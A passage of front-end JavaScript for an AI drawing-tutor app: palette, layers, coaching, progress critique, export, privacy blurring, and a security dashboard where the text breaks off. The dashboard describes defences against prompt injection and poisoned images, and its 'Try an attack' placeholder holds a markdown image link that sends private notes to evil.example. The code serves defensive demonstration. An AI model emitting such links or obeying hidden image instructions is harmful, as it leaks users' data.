  if (now - S.lastBuddyAt < 25000 || S.strokesSinceReact < 10) return;
  const t = analyzeTelemetry(engine.strokes, engine.undoCount), pos = t.notes.find((n) => n.positive), neg = t.notes.find((n) => !n.positive);
  if (pos) buddy.say(`${pos.tip} (${pos.evidence})`, 'positive'); else if (neg) buddy.say(`${neg.tip} (${neg.evidence})`, 'constructive'); else buddy.say(reaction(Math.random() < 0.25 ? 'experiment' : 'positive'), 'positive');
  S.lastBuddyAt = now; S.strokesSinceReact = 0;
});
$('quietToggle').onchange = (e) => { S.quiet = e.target.checked; toast(S.quiet ? 'Quiet mode on — I’ll only speak when you ask.' : 'Buddy may chime in again.'); };

/* ================================================================ RIGHT PANEL */
document.querySelectorAll('#rtabs button').forEach((b) => (b.onclick = () => {
  document.querySelectorAll('#rtabs button').forEach((x) => x.classList.toggle('on', x === b));
  document.querySelectorAll('.pane').forEach((p) => p.classList.toggle('on', p.id === b.dataset.pane));
}));
function openPane(id) { document.querySelector(`#rtabs button[data-pane="${id}"]`).click(); }

/* ---------- palette ---------- */
function mixHint(hex) {
  const [r, g, b] = hexToRgb(hex) || [128, 128, 128], [L, A, B] = rgbToLab(r, g, b), C = Math.hypot(A, B);
  const hue = (Math.atan2(B, A) * 180) / Math.PI;
  let t;
  if (C < 12) t = 'A near-neutral. Try warming it with a touch of ochre, or cooling it with a little blue, instead of using flat gray.';
  else if (L < 28) t = 'For a rich dark, mix a deep blue with a brown or purple rather than reaching for pure black.';
  else if (L > 85) t = 'Add a little of your main color to white instead of the other way around, and keep a slightly warm or cool tint so it doesn’t look chalky.';
  else if (hue > 20 && hue < 110) t = 'A warm color. A hint of its opposite (a touch of blue) will dull it naturally for shadows.';
  else if (hue >= 110 || hue < -100) t = 'A cool color. Warm it with a little of its neighbor on the warm side for sunlit areas.';
  else t = 'Mix this from two neighbors on the color wheel, then nudge it lighter or darker for the value you need.';
  return `${t} (Qualitative idea only — exact paint ratios depend on your pigments.)`;
}
function renderPalette() {
  const pal = [...S.lesson.palette].sort((a, b) => b.fraction_estimate - a.fraction_estimate);
  $('swatches').replaceChildren(...pal.map((p, i) => h('button', { class: 'swatch', style: `background:${p.hex};color:${hexLum(p.hex) > 150 ? '#34323D' : '#fff'};--i:${i}`, title: p.hex, onclick: (e) => {
    engine.setColor(p.hex); addRecent(p.hex); $('mixTips').textContent = mixHint(p.hex); document.querySelectorAll('.swatch').forEach((x) => x.classList.toggle('on', x === e.currentTarget)); toast(`${p.role} · ${p.hex}`, 1200);
  } }, p.role, h('small', {}, `${Math.round(p.fraction_estimate * 100)}% · ${p.hex}`))));
  const f = S.analysis.summary.masses.valueFractions3, shades = ['#4a4758', '#a29bb8', '#f1ebe0'], names = ['dark', 'mid', 'light'];
  $('valueBars').replaceChildren(...f.map((v, i) => h('div', { style: `flex:${Math.max(v, 0.02)};background:${shades[i]};color:${i === 2 ? '#34323D' : '#fff'}` }, `${names[i]} ${Math.round(v * 100)}%`)));
}
$('btnPeel').onclick = () => showPeel();

/* ---------- layers ---------- */
function renderLayers() {
  const ul = $('layerList'); ul.replaceChildren();
  engine.layers.forEach((l, i) => ul.append(h('li', { class: i === engine.active ? 'on' : '' },
    h('button', { class: 'eye', onclick: () => engine.setLayerVisible(i, !l.visible) }, l.visible ? '👁️' : '🚫'),
    h('button', { class: 'nm', onclick: () => engine.selectLayer(i) }, l.name, i === engine.active ? ' · drawing here' : ''),
    h('input', { type: 'range', min: 10, max: 100, value: Math.round(l.opacity * 100), 'aria-label': `${l.name} opacity`, oninput: (e) => engine.setLayerOpacity(i, e.target.value / 100) }))));
}
engine.on('layers', renderLayers);
$('btnAddLayer').onclick = () => engine.addLayer();
$('btnClearLayer').onclick = () => { engine.clearActive(); toast('Layer cleared — you can undo this'); };

/* ---------- peel modal ---------- */
function showPeel() {
  S.layersCache ||= buildPaintingLayers(S.analysis.maps);
  const stages = S.layersCache; S.sess && S.sess.viewed.add('peel');
  const stageBox = h('div', { class: 'peel-stage' }), title = h('h3', {}), note = h('p', {}), range = h('input', { type: 'range', min: 0, max: stages.length - 1, value: 0, step: 1, 'aria-label': 'Painting layer' });
  const canv = stages.map((s, i) => { const c = h('canvas', { width: s.canvas.width, height: s.canvas.height, style: `z-index:${i}` }); c.getContext('2d').drawImage(s.canvas, 0, 0); stageBox.append(c); return c; });
  let playing = null;
  const set = (k) => { canv.forEach((c, i) => c.classList.toggle('gone', i > k)); title.textContent = `${k + 1}. ${stages[k].title}`; note.textContent = stages[k].note; range.value = k; };
  range.oninput = () => { clearInterval(playing); set(+range.value); };
  const play = h('button', { class: 'primary', onclick: () => { clearInterval(playing); let k = 0; set(0); playing = setInterval(() => { k++; if (k >= stages.length) { clearInterval(playing); return; } set(k); }, 1300); } }, '▶ Build it up');
  const goToLayers = h('button', { class: 'pill', onclick: () => { closeModal(); openPane('paneLayers'); } }, 'Use it: add a drawing layer');
  set(0);
  openModal(h('h2', {}, '🧅 Peel the painting layers'), h('p', { class: 'fine' }, 'Drag the slider to build the image up from big color masses to final details.'), stageBox, title, note, range, h('div', { class: 'btn-row' }, play, goToLayers),
    h('p', { class: 'fine disclaimer' }, 'These layers are a plausible teaching sequence generated from the image’s colors and values — not the original artist’s real painting process.'));
}

/* ---------- coach ---------- */
async function coachRequest(kind) {
  const st = step(), card = $('coachCard'); card.hidden = false;
  const setCard = (t) => {
    card.replaceChildren(h('h5', {}, t.title), h('p', {}, t.body), t.why ? h('p', { class: 'why' }, `Why it works: ${t.why}`) : null,
      t.exercise ? h('div', { class: 'ex' }, h('b', {}, `Try this (${t.exercise.duration_minutes} min): `), t.exercise.exercise, h('br'), h('small', {}, t.exercise.why || ''), h('div', { class: 'btn-row' }, h('button', { class: 'pill', onclick: () => { const n = journey.practiceDone(t.id || 'exercise'); toast(`Logged to your journey (${n}×) 🌸`); petals($('petals'), 8); if (S.sess) S.sess.exercises = (S.sess.exercises || 0) + 1; } }, 'I did it ✓'))) : null);
    card.style.animation = 'none'; void card.offsetWidth; card.style.animation = '';
  };
  if (kind === 'wrong') { openPane('paneBuddy'); return checkProgress(); }
  if (kind === 'why') return setCard({ title: `Why “${st.title}”?`, body: st.why || 'Large decisions first make the small ones easier.', why: 'Working big-to-small keeps mistakes cheap to fix.' });
  if (kind === 'example') {
    if (!S.guideVisible) setGuideVisible(true); drawGuides(true);
    return setCard({ title: 'Watch the guides draw in', body: 'The lavender shapes show where this step’s marks go. They are optional: use them, nudge them, or ignore them.', why: 'Seeing the build-up order is what makes the final shape feel obvious.' });
  }
  const tech = techniqueFor(st.technique || 'composition', S.shown); S.shown.push(tech.id);
  if (kind === 'exercise') return setCard({ ...tech, title: `Quick exercise: ${tech.title}`, body: tech.body });
  let t = { ...tech };
  if (S.ai.hasKey) {
    card.replaceChildren(h('p', {}, 'Thinking of a good tip…'));
    const r = await api('/api/coach', { kind: kind === 'easier' ? 'an easier way to do this step' : 'a different technique for this step', imageType: S.lesson.analysis.image_type, medium: S.opts.medium, step: { title: st.title, instruction: st.instruction }, shown: S.shown }, 15000);
    noteSecurity(r); if (r && r.ok && r.tip) t = { id: tech.id, ...r.tip };
  }
  setCard(t); buddy.say(t.body, 'tip', { log: true, mood: 'think' });
}
$('coachBtns').querySelectorAll('button').forEach((b) => (b.onclick = () => coachRequest(b.dataset.coach)));

/* ================================================================ CHECK MY PROGRESS */
const prims0 = (st) => stepPrims(st).filter((p) => p.role && (p.kind === 'ellipse' || p.kind === 'polygon'));
const QUAD = ['upper left', 'upper right', 'lower left', 'lower right'];
/** For each marker: how much of it has the artist's marks (fill → area covered; outline → perimeter traced). */
function targetProgress(ps, W, H, draw) {
  const out = [];
  for (const p of ps) {
    const fillM = makeMask(W, H); rasterizePrimitive(fillM, W, H, p, 'fill');
    const kind = p.role === 'shade' && ['fill', 'hatch'].includes(p.action) ? 'fill' : p.role === 'feature' ? 'outline' : null;
    if (!kind) { out.push({ label: p.label, kind: 'none', pct: null }); continue; }
    let total = 0, hit = 0, ux = 0, uy = 0, un = 0, bx0 = W, by0 = H, bx1 = 0, by1 = 0;
    if (kind === 'fill') {
      const near = p.action === 'hatch' ? dilate(draw, W, H, Math.max(2, Math.round(W * 0.02))) : draw;
      for (let y = 0; y < H; y++) for (let x = 0; x < W; x++) { const i = y * W + x; if (!fillM[i]) continue; total++; if (x < bx0) bx0 = x; if (x > bx1) bx1 = x; if (y < by0) by0 = y; if (y > by1) by1 = y; if (near[i]) hit++; else { ux += x; uy += y; un++; } }
    } else {
      const ol = makeMask(W, H); rasterizePrimitive(ol, W, H, p, 'outline', 2); const near = dilate(draw, W, H, Math.max(2, Math.round(W * 0.025)));
      for (let y = 0; y < H; y++) for (let x = 0; x < W; x++) { const i = y * W + x; if (!ol[i]) continue; total++; if (x < bx0) bx0 = x; if (x > bx1) bx1 = x; if (y < by0) by0 = y; if (y > by1) by1 = y; if (near[i]) hit++; else { ux += x; uy += y; un++; } }
    }
    if (!total) continue;
    let where = ''; if (un > total * 0.15) { const mx = ux / un, my = uy / un, cx = (bx0 + bx1) / 2, cy = (by0 + by1) / 2; where = QUAD[(my > cy ? 2 : 0) + (mx > cx ? 1 : 0)]; }
    out.push({ label: p.label, kind, pct: Math.round((hit / total) * 100), where });
  }
  return out;
}
function measure() {
  const maps = S.analysis.maps, W = maps.w, H = maps.h, st = step();
  const alpha = engine.alphaAt(W, H), draw = new Uint8Array(W * H), a8 = new Uint8Array(W * H); let painted = 0;
  for (let i = 0; i < W * H; i++) { const a = alpha[i * 4 + 3]; a8[i] = a; if (a > 20) { draw[i] = 1; painted++; } }
  const emptiness = 1 - painted / (W * H);
  const prims = []; for (const g of st.guides || []) for (const p of resolveGuide(g, S.analysis.summary)) if (['ellipse', 'polygon', 'polyline', 'rect', 'line'].includes(p.kind)) prims.push(p);
  let coverage = null;
  if (prims.length && painted) { const gm = makeMask(W, H); prims.forEach((p) => rasterizePrimitive(gm, W, H, p, 'outline', 3)); coverage = coverageReport(gm, draw, W, H, Math.max(4, W * 0.035), W * 0.1); }
  let valueNotes = [];
  if (['value', 'underpainting', 'shadow', 'midtone', 'highlight'].includes(st.phase) && painted) {
    const c = engine.composite({ maxSide: Math.max(W, H) }), tmp = document.createElement('canvas'); tmp.width = W; tmp.height = H; tmp.getContext('2d').drawImage(c, 0, 0, W, H);
    const px = tmp.getContext('2d').getImageData(0, 0, W, H).data, g = new Float32Array(W * H);
    for (let i = 0; i < W * H; i++) g[i] = 0.2126 * px[i * 4] + 0.7152 * px[i * 4 + 1] + 0.0722 * px[i * 4 + 2];
    valueNotes = valueNotesFrom({ refGray: maps.gray, refLevels: maps.levels3, drawGray: g, drawAlpha: a8 });
  }
  const telemetry = analyzeTelemetry(engine.strokes, engine.undoCount);
  const targets = painted ? targetProgress(prims0(st), W, H, draw) : [];
  S.prog ||= {}; targets.forEach((t) => { S.prog[`${S.stepIdx}:${t.label}`] = t; }); renderTargets();
  return { emptiness, coverage, valueNotes, telemetry, targets, strokeCount: engine.strokeTotal, painted };
}
let checking = false;
async function checkProgress() {
  if (checking) return; checking = true;
  try {
    buddy.mood('think'); buddy.say('Taking a careful look…', 'tip', { log: false });
    const m = measure(), st = step(); S.sess.checks++;
    if (m.coverage) S.sess.coverage.push({ c: m.coverage.coverage, stray: m.coverage.stray, weakest: m.coverage.weakest });
    let result = localCritique({ coverage: m.coverage, valueNotes: m.valueNotes, telemetry: m.telemetry, stepTitle: st.title, emptiness: m.emptiness, strokeCount: m.strokeCount, targets: m.targets });
    if (S.ai.hasKey && m.emptiness < 0.995) {
      const metrics = { painted_fraction: +(1 - m.emptiness).toFixed(3), guide_coverage_pct: m.coverage ? Math.round(m.coverage.coverage * 100) : null, marker_progress: (m.targets || []).filter((t) => typeof t.pct === 'number').map((t) => `${t.label}: ${t.pct}% ${t.kind === 'fill' ? 'filled' : 'traced'}${t.where ? ` (least in the ${t.where})` : ''}`), weakest_region: m.coverage ? m.coverage.weakest : null, value_notes: m.valueNotes.map((n) => n.evidence), stroke_notes: m.telemetry.notes.map((n) => n.evidence), strokes: m.strokeCount };
      const drawing = engine.composite({ maxSide: 512 }).toDataURL('image/jpeg', 0.8);
      const r = await api('/api/critique', { reference: aiJpeg(512, 0.8), drawing, step: { title: st.title, instruction: st.instruction }, medium: S.opts.medium, level: S.opts.level, metrics }, 40000);
      noteSecurity(r);
      if (r && r.ok && r.critique) result = { ...r.critique, source: 'ai' }; else toast('AI critique unavailable — here are the measurements-based notes.', 3200);
    }
    showCritique(result, m);
  } finally { checking = false; }
}
function showCritique(r, m) {
  const card = $('critiqueCard'); card.hidden = false;
  card.replaceChildren(
    h('div', { class: 'row pos' }, h('b', {}, 'Going well'), r.positive),
    h('div', { class: 'row imp' }, h('b', {}, 'Try next'), r.improve),
    r.tip ? h('div', { class: 'row tipr' }, h('b', {}, 'Technique'), r.tip) : null,
    h('div', { class: 'row ev' }, h('b', {}, `Evidence · ${r.confidence || 'low'} confidence · ${r.source === 'ai' ? 'AI + measurements' : 'measured locally'}`), r.evidence || ''),
    h('button', { class: 'pill good', onclick: () => markDone() }, 'Mark this step done ✓'));
  buddy.say(r.positive, 'positive', { mood: 'cheer' }); buddy.say(r.improve, 'constructive', { mood: null });
  if (m && m.coverage && m.coverage.coverage >= 0.75) setTimeout(() => buddy.say('You’ve covered most of this step’s guide — ready for the next one?', 'tip'), 700);
  openPane('paneBuddy'); S.lastBuddyAt = Date.now();
}
$('btnCheck').onclick = checkProgress; $('btnCheck2').onclick = () => { openPane('paneBuddy'); checkProgress(); if (matchMedia('(max-width:1120px)').matches) { openDrawer('right'); } };

/* ================================================================ EXPORT */
async function exportArt(share, artOnly = false) {
  const c = engine.composite({ scale: 1, only: artOnly ? (l) => !/scaffold/i.test(l.name) : null }), blob = await canvasBlob(c), name = `${(S.ref.name || 'canvasbuddy').replace(/\W+/g, '-').toLowerCase()}-my-art.png`;
  if (share && navigator.canShare) {
    const file = new File([blob], name, { type: 'image/png' });
    if (navigator.canShare({ files: [file] })) { try { await navigator.share({ files: [file], title: 'My artwork' }); happySpin(); return; } catch (e) { if (e.name === 'AbortError') return; } }
  }
  downloadBlob(blob, name); toast('Saved your artwork 🎨'); happySpin(); petals($('petals'), 12);
}
function showExport() {
  const can = !!(navigator.canShare && navigator.canShare({ files: [new File([''], 'a.png', { type: 'image/png' })] }));
  const btn = (label, desc, fn) => h('button', { class: 'card', style: 'text-align:left;width:100%;margin-bottom:10px', onclick: fn }, h('b', {}, label), h('br'), h('small', {}, desc));
  openModal(h('h2', {}, '⬇️ Export'),
    btn('Artwork (PNG)', 'Everything that is visible, on paper, full resolution.', async () => { closeModal(); await exportArt(false); }),
    engine.layers.length > 1 ? btn('Art layers only (no scaffold)', 'Leaves out the rough construction layer.', async () => { closeModal(); await exportArt(false, true); }) : null,
    can ? btn('Share / save to Photos', 'Opens the iPad share sheet.', async () => { closeModal(); await exportArt(true); }) : null,
    btn('This step’s guides (transparent PNG)', 'Import as a reference layer in Procreate, Krita, Photoshop…', async () => { closeModal(); const b = await guidePng($('guides'), engine.doc.w, engine.doc.h); downloadBlob(b, `guides-step-${S.stepIdx + 1}.png`); }),
    btn('This step’s guides (SVG paths)', 'Vector construction guides.', () => { closeModal(); downloadBlob(new Blob([guideSvgString($('guides'))], { type: 'image/svg+xml' }), `guides-step-${S.stepIdx + 1}.svg`); }),
    btn('Lesson (JSON)', 'The structured lesson Buddy generated.', () => { closeModal(); downloadBlob(new Blob([JSON.stringify(S.lesson, null, 2)], { type: 'application/json' }), 'lesson.json'); }));
}
$('btnExport').onclick = showExport;

/* ================================================================ FINISH, RECAP, JOURNEY */
function buildSession() {
  const L = S.lesson, sess = S.sess, steps = L.steps.length, doneN = S.done.size;
  const covs = sess.coverage.map((x) => x.c).sort((a, b) => a - b), median = covs.length ? covs[Math.floor(covs.length / 2)] : null;
  const last = sess.coverage[sess.coverage.length - 1];
  const t = analyzeTelemetry(engine.strokes, engine.undoCount);
  const thumb = (() => { try { return engine.composite({ maxSide: 240 }).toDataURL('image/jpeg', 0.7); } catch { return null; } })();
  const free = S.opts.mode === 'free';
  return {
    id: sess.id, at: Date.now(), title: S.ref.name, reference_type: L.analysis.image_type, medium: S.opts.medium, mode: S.opts.mode, strategy: L.strategy,
    finished: free ? engine.strokeTotal >= 10 : doneN >= steps, techniques: [...new Set(sess.stepsDone.map((x) => x.technique).filter(Boolean))], techniques_practiced: [...new Set(sess.stepsDone.map((x) => x.technique).filter(Boolean))],
    stepsDone: sess.stepsDone, paletteExplored: sess.viewed.size > 0, thumb,
    evidence: {
      stepsCompleted: doneN, stepsTotal: steps, guideRevealsPerStep: free ? 0 : doneN ? sess.guideSteps / doneN : 1, strokes: engine.strokeTotal, undos: engine.undoCount, strokeSamplesAvailable: engine.strokeTotal > 0,
      minutes: Math.round(sess.activeMs / 60000), checks: sess.checks, input: sess.pencil ? 'pencil' : 'touch/mouse',
      coverage: covs.length ? { median, weakest: last && last.weakest, stray: last ? last.stray : 0 } : null, notes: t.notes, valueNotes: [],
    },
  };
}
let finishing = false;
async function finishProject() {
  if (finishing || !S.lesson) return; finishing = true; setTimeout(() => (finishing = false), 1500);
  try {
    const session = buildSession(); const earned = journey.record(session); const recap = buildRecap(session, journey);
    petals($('petals'), 30); happySpin();
    const body = h('div', {});
    const render = (rc) => {
      body.replaceChildren(
        h('h2', {}, '🌸 Your art journey'), h('p', { class: 'fine' }, `${session.title} · ${S.opts.medium} · ${session.evidence.stepsCompleted}/${session.evidence.stepsTotal} steps${session.evidence.minutes ? ` · ~${session.evidence.minutes} min` : ''}`),
        h('div', { class: 'recap-grid' },
          h('div', {}, session.thumb ? h('img', { src: session.thumb, alt: 'Your artwork' }) : null, h('div', { class: 'btn-row' }, h('button', { class: 'pill', onclick: () => exportArt(false) }, 'Save PNG'))),
          h('div', {},
            rc.starting ? h('div', { class: 'rc mile' }, '🌱 ', rc.reflection) : null,
            h('h3', {}, 'What went well'), ...rc.wentWell.map((x) => h('div', { class: 'rc good' }, x)),
            h('h3', {}, 'Something to work on'), ...rc.improve.map((x) => h('div', { class: 'rc work' }, x)),
            rc.trend.length ? h('div', { class: 'rc good' }, ...rc.trend) : null,
            h('h3', {}, 'Your next mini-challenge'),
            ...rc.next.map((n) => h('div', { class: 'rc next' }, h('b', {}, `${n.exercise} `), `(${n.duration_minutes} min)`, h('br'), h('small', {}, n.why), h('div', {}, h('button', { class: 'pill ex-btn', onclick: (ev) => { journey.practiceDone(n.id); ev.currentTarget.textContent = 'Logged ✓'; ev.currentTarget.disabled = true; } }, 'I did it ✓')))),
            earned.length ? h('h3', {}, 'Milestones unlocked') : null, ...earned.map((m) => h('div', { class: 'rc mile' }, `${m.icon} ${m.title}`)),
            h('h3', {}, 'Next goal'), h('div', { class: 'rc next' }, rc.tryNext), rc.aiWording ? h('p', { class: 'fine' }, '✨ Wording by AI from your session data. Numbers come from measurements.') : null,
            !rc.starting && rc.reflection ? h('p', { class: 'fine' }, rc.reflection) : null)),
        h('div', { class: 'btn-row' }, h('button', { class: 'pill', onclick: () => closeModal() }, 'Keep drawing'), h('button', { class: 'pill', onclick: () => { closeModal(); showJourney(); } }, 'My gallery'), h('button', { class: 'primary', onclick: () => { closeModal(); goHome(); } }, 'New project')));
    };
    render(recap); openModal(body);
    if (S.ai.hasKey) {
      const ev = { reference_type: session.reference_type, medium: session.medium, mode: session.mode, steps_completed: session.evidence.stepsCompleted, steps_total: session.evidence.stepsTotal, techniques: session.techniques, strokes: session.evidence.strokes, undos: session.evidence.undos, minutes: session.evidence.minutes, guide_use_per_step: +session.evidence.guideRevealsPerStep.toFixed(2), notes: session.evidence.notes.map((n) => n.evidence), previous_sessions: journey.sessions.length - 1, coverage: session.evidence.coverage };
      api('/api/recap', { session: ev }, 20000).then((r) => { noteSecurity(r); if (r && r.ok && r.recap && !$('modalRoot').hidden) render(buildRecap(session, journey, r.recap)); });
    }
  } catch (e) { finishing = false; throw e; }
}
$('btnFinish').onclick = () => finishProject();

function showJourney() {
  const ms = journey.milestoneList(), ss = [...journey.sessions].reverse();
  openModal(h('h2', {}, '🌸 My art journey'),
    h('p', { class: 'fine' }, ss.length ? `${ss.length} project${ss.length > 1 ? 's' : ''} saved on this device only.` : 'Nothing here yet — finish your first project to start your gallery. Everything stays on this device.'),
    h('h3', {}, 'Milestones'), h('div', { class: 'mile-list' }, ...ms.map((m) => h('div', { class: `mile ${m.earned ? 'earned' : ''}` }, `${m.earned ? m.icon : '🔒'} ${m.title}`))),
    h('h3', {}, 'Gallery'),
    ss.length ? h('div', { class: 'gallery' }, ...ss.map((s) => h('div', { class: 'g-item' }, s.thumb ? h('img', { src: s.thumb, alt: s.title }) : h('div', { style: 'aspect-ratio:4/3;background:#f4effb;border-radius:9px' }), h('b', {}, s.title), h('br'),
      h('small', {}, `${new Date(s.at).toLocaleDateString()} · ${s.finished ? 'finished' : 'in progress'}`), h('br'), h('small', {}, (s.techniques || []).map((t) => t.replace(/_/g, ' ')).join(', ') || '—'),
      h('div', {}, h('button', { class: 'ghost', style: 'min-height:36px;padding:4px 8px;font-size:12px', onclick: () => { journey.remove(s.id); showJourney(); } }, 'Delete'))))) : h('p', { class: 'fine' }, 'Your finished pieces will appear here.'),
    h('div', { class: 'btn-row' }, h('button', { class: 'pill', onclick: () => downloadBlob(new Blob([journey.exportJson()], { type: 'application/json' }), 'my-art-journey.json') }, 'Export my data'),
      h('button', { class: 'pill', onclick: () => { if (confirm('Delete your whole journey from this device?')) { journey.clearAll(); showJourney(); } } }, 'Delete everything')));
}
$('btnJourney').onclick = showJourney;

/* ================================================================ NAV / DRAWERS */
function goHome() { if (engine.strokeTotal > 0 && !confirm('Leave this project? Save your artwork first if you want to keep it.')) return; show('start'); }
$('btnHome').onclick = goHome;
function openDrawer(side) { closeDrawers(); $(side === 'left' ? 'left' : 'right').classList.add('open'); $('drawerBackdrop').hidden = false; }
function closeDrawers() { $('left').classList.remove('open'); $('right').classList.remove('open'); $('drawerBackdrop').hidden = true; }
$('btnLesson').onclick = () => ($('left').classList.contains('open') ? closeDrawers() : openDrawer('left'));
$('btnBuddy').onclick = () => ($('right').classList.contains('open') ? closeDrawers() : openDrawer('right'));
$('drawerBackdrop').onclick = closeDrawers;
window.addEventListener('beforeunload', (e) => { if (engine.strokeTotal > 0 && !$('studio').hidden) { e.preventDefault(); e.returnValue = ''; } });

/* ---------- resizable right panel (persisted) ---------- */
(() => {
  const root = $('studio'), h = $('rResize'), KEY = 'cb.sideR';
  const set = (w) => { w = clamp(Math.round(w), 260, Math.min(640, innerWidth * 0.6)); root.style.setProperty('--side-r', `${w}px`); try { localStorage.setItem(KEY, w); } catch { /* ignore */ } requestAnimationFrame(() => { engine._rect = null; }); return w; };
  try { const v = +localStorage.getItem(KEY); if (v) root.style.setProperty('--side-r', `${clamp(v, 260, 640)}px`); } catch { /* ignore */ }
  h.addEventListener('pointerdown', (e) => { e.preventDefault(); h.setPointerCapture(e.pointerId); h.classList.add('drag'); });
  h.addEventListener('pointermove', (e) => { if (h.classList.contains('drag')) set(root.getBoundingClientRect().right - e.clientX); });
  const end = () => { h.classList.remove('drag'); engine._rect = null; };
  h.addEventListener('pointerup', end); h.addEventListener('pointercancel', end);
  h.addEventListener('dblclick', () => set(328));
})();

/* ================================================================ PRIVACY: scrub + receipt preview */
$('privGray').onchange = (e) => (S.privGray = e.target.checked);
function updateScrubNote() { $('scrubNote').textContent = S.scrub.length ? `${S.scrub.length} area${S.scrub.length > 1 ? 's' : ''} will be blurred before anything is sent.` : ''; }
$('btnScrub').onclick = () => {
  if (!S.ref) return toast('Choose a reference first');
  const cv = h('canvas', { class: 'scrub-canvas' }), base = toCanvas(S.ref.img, 640); cv.width = base.width; cv.height = base.height;
  const rects = S.scrub.map((r) => r.slice()); let cur = null;
  const redraw = () => { const c = modelCanvas(S.ref.img, { maxSide: 640, scrub: rects.concat(cur ? [norm(cur)] : []) }); const x = cv.getContext('2d'); x.clearRect(0, 0, cv.width, cv.height); x.drawImage(c, 0, 0, cv.width, cv.height); if (cur) { const n = norm(cur); x.strokeStyle = '#7c6bd6'; x.lineWidth = 2; x.setLineDash([6, 4]); x.strokeRect(n[0] * cv.width, n[1] * cv.height, (n[2] - n[0]) * cv.width, (n[3] - n[1]) * cv.height); x.setLineDash([]); } };
  const norm = (c) => [Math.min(c.x0, c.x1), Math.min(c.y0, c.y1), Math.max(c.x0, c.x1), Math.max(c.y0, c.y1)];
  const pt = (e) => { const r = cv.getBoundingClientRect(); return { x: clamp((e.clientX - r.left) / r.width, 0, 1), y: clamp((e.clientY - r.top) / r.height, 0, 1) }; };
  cv.onpointerdown = (e) => { cv.setPointerCapture(e.pointerId); const p = pt(e); cur = { x0: p.x, y0: p.y, x1: p.x, y1: p.y }; };
  cv.onpointermove = (e) => { if (!cur) return; const p = pt(e); cur.x1 = p.x; cur.y1 = p.y; redraw(); };
  cv.onpointerup = () => { if (cur) { const n = norm(cur); if (n[2] - n[0] > 0.01 && n[3] - n[1] > 0.01) rects.push(n); cur = null; redraw(); } };
  redraw();
  openModal(h('h2', {}, '🫥 Blur sensitive areas'), h('p', { class: 'fine' }, 'Drag over anything private (faces, names, screen text, unreleased IP). Those areas are mosaicked in the copy sent to the AI. Your drawing canvas and reference stay untouched.'), cv,
    h('div', { class: 'btn-row' }, h('button', { class: 'pill', onclick: () => { rects.pop(); redraw(); } }, 'Undo last'), h('button', { class: 'pill', onclick: () => { rects.length = 0; redraw(); } }, 'Clear'),
      h('button', { class: 'primary', onclick: () => { S.scrub = rects; updateScrubNote(); closeModal(); toast(rects.length ? 'Blurred areas saved — only the blurred copy is sent.' : 'No blurred areas.'); } }, 'Done')));
};
$('btnReceipt').onclick = () => {
  if (!S.ref) return toast('Choose a reference first');
  const goal = sanitizeText(goalString(), { max: 160 }), c = aiCanvas(768), small = c.toDataURL('image/jpeg', 0.82);
  const img = h('img', { src: small, alt: 'What the AI will see', style: 'max-width:100%;border-radius:12px;border:1.5px solid var(--line)' });
  openModal(h('h2', {}, '👁 Exactly what is sent'), h('div', { class: 'receipt' }, img,
    h('p', { class: 'fine' }, `Image: ${c.width}×${c.height}px JPEG (${Math.round(small.length * 0.75 / 1024)} KB), re-drawn on a canvas so EXIF/GPS/comments are gone${S.privGray ? ', grayscale' : ''}${S.scrub.length ? `, ${S.scrub.length} blurred area(s)` : ''}. A second copy adds a grid + region labels (no extra pixels of yours).`),
    h('pre', {}, JSON.stringify({ mode: S.opts.mode, medium: S.opts.medium, level: S.opts.level, goal: goal.text || '(none)', guardrail_flags: goal.flags, measured_stats: 'palette, value fractions, region boxes — numbers only' }, null, 2)),
    h('p', { class: 'fine' }, 'Also stripped server-side before the model sees anything: remaining image metadata, links, HTML, long encoded blobs, invisible characters.')));
};

/* ================================================================ SHIELD (security dashboard) */
async function showShield() {
  const body = h('div', {}, h('h2', {}, '🛡️ Security Shield'), h('p', { class: 'fine' }, 'Loading…')); openModal(body);
  const sec = await api('/api/security', null, 5000);
  const layers = [
    ['Prompt-injection sandbox', 'Goal text is sanitised (hidden characters, fake system tags, “ignore previous…”, links) and passed to the model as marked untrusted data.'],
    ['Pixel & metadata hygiene', 'Images are re-drawn in your browser (EXIF/GPS gone), optionally blurred or grayscale, then byte-inspected and stripped again on the server. Hidden text in metadata is scanned for injections.'],
    ['Output guardrail', 'Every AI string is scanned for leaked keys, a secret canary token, injection echoes, links and HTML before it reaches the screen. The UI only ever uses textContent.'],
    ['Audit Agent', 'Each step’s markers are checked against the image’s own pixels (is the “dark eye socket” really dark?). Failures are flagged “unverified”, repaired, or regenerated.'],
    ['Server hardening', 'API key stays server-side, strict Content-Security-Policy, rate limiting, request-size caps, path-traversal guard, no key in logs.'],
  ];
  const counts = (sec && sec.counts) || {}, events = (sec && sec.events) || [];
  const a = S.audit;
  body.replaceChildren(h('h2', {}, '🛡️ Security Shield'),
    h('div', { class: 'shield-grid' }, ...layers.map(([t, d]) => h('div', { class: 'card' }, h('b', {}, `✓ ${t}`), h('br'), d))),
    h('h3', {}, 'This session'),
    h('p', { class: 'fine' }, sec && sec.ok ? `${sec.calls} AI request(s) screened. ${Object.keys(counts).length ? '' : 'Nothing suspicious so far.'}` : 'Server not reachable.'),
    Object.keys(counts).length ? h('ul', { class: 'shield-log' }, ...Object.entries(counts).map(([k, n]) => h('li', {}, `${n}× ${FLAG_HELP[k] || k}`))) : null,
    a ? h('div', { class: 'card', style: 'margin:10px 0' }, h('b', {}, 'Lesson audit: '), `${a.verified} verified, ${a.weak} partly, ${a.unverified} unverified (overall ${Math.round(a.overall * 100)}%).`) : null,
    S.receipts.length ? h('div', {}, h('h3', {}, 'Latest data receipt'), h('div', { class: 'receipt' }, h('pre', {}, JSON.stringify(S.receipts[0], null, 2)))) : null,
    h('h3', {}, 'Stress test'), h('p', { class: 'fine' }, 'Fires about 50 real attacks at the live guardrails on this server — and a set of normal requests to prove it does not block honest users.'), stressPanel(),
    h('h3', {}, 'Poisoned-image demo'), h('p', { class: 'fine' }, 'These pictures hide instructions in their file data, and one also has the instruction painted into the pixels. Load one and watch what happens.'), poisonPanel(),
    h('h3', {}, 'Try an attack'), h('p', { class: 'fine' }, 'A picture link hidden in a caption can quietly send data to another site the moment it is shown. Paste one below and see what the guardrail does with it.'),
    (() => { const out = h('pre', { style: 'background:#f4effb;padding:10px;border-radius:12px;font-size:12px;white-space:pre-wrap' }, 'Result appears here.'), inp = h('input', { type: 'text', placeholder: 'Nice sketch! ![x](https://evil.example/?d=private-notes)', style: 'width:100%' });
